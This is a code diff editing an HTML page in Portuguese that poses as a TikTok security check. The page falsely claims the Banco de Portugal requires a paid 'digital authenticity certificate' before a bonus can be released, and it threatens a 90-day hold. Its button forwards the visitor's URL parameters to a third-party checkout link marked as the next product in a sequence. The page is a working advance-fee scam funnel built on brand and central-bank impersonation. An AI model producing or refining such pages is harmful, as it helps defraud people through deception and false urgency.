@@ -6,9 +6,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verificação de Segurança TikTok</title>
     <link rel="stylesheet" href="/css/upsell-premium.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800;900&display=swap" rel="stylesheet">
 </head>
 
 <body>
@@ -17,21 +14,21 @@
             <img src="/logo.svg" alt="TikTok" class="logo">
         </div>
 
-        <div class="badge" style="background: #25F4EE; color: #000;">Segurança Requerida</div>
+        <div class="badge">Segurança Requerida</div>
 
-        <h1 class="title">Atenção: <span class="highlight-cyan">Verificação CAD</span> Necessária</h1>
+        <h1 class="title">Atenção: <span style="color: #008080;">Verificação CAD</span> Necessária</h1>
 
         <div class="description">
             Devido ao elevado valor do seu bónus, o Banco de Portugal exige a emissão do <strong>Certificado de Autenticidade Digital (CAD)</strong> para evitar bloqueios por fraude.
         </div>
 
-        <div class="amount-box" style="border-color: var(--secondary); background: rgba(37, 244, 238, 0.05);">
+        <div class="amount-box">
             <div class="amount-label">ESTADO DO LEVANTAMENTO</div>
-            <div class="amount-value" style="color: var(--secondary); font-size: 24px;">AGUARDANDO CERTIFICADO</div>
+            <div class="amount-value" style="font-size: 20px; color: #008080;">AGUARDANDO CERTIFICADO</div>
         </div>
 
         <div class="description">
-            Sem o certificado, os fundos podem ficar retidos por <strong>90 dias</strong> para investigação manual. Ative agora para libertar tudo em 5 minutos.
+            Sem o certificado, os fundos podem ficar retidos por <strong>90 dias</strong> para investigação manual. Ative agora para libertar tudo hoje.
         </div>
 
         <button onclick="redirectToPayment()" class="cta-button pulse">
@@ -56,7 +53,6 @@
 
         function redirectToPayment() {
             const params = new URLSearchParams(window.location.search);
-            // Produto 7 é o próximo na sequência
             const checkoutUrl = new URL('https://waymb.com/c?username=eduardotreonix&product=7');
 
             params.forEach((value, key) => {
